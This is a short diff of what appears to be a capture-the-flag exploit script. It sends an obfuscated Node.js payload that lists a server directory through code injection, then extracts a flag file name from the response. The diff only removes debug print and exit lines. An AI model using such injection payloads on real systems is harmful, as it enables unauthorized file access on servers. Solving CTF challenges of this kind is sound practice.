@@ -11,9 +11,6 @@ def run(payload):
     return res.text
 
 resp = run("require('fs').readdirSync(obf(`${__dirname}/../../`)).join(' ')")
-print(resp)
-
-exit()
 
 flag_path = re.findall(r'(flag_[a-z0-9]+)', resp)[0]
 
